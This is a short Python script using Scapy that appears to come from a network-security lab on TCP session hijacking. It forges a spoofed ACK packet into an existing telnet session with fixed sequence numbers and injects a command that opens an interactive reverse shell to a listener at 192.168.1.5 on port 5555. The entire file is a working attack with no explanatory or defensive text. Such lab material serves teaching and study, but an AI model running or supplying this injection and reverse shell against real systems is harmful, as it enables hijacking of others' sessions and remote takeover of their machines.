#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET....")
IPLayer = IP(src = "192.168.1.7", dst = "192.168.1.10")
TCPLayer = TCP(sport = 43396, dport=23, flags = "A", seq=3840082455 , ack = 303366534)
Data = "\r /bin/bash -i > /dev/tcp/192.168.1.5/5555 2>&1 0<&1 \r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)
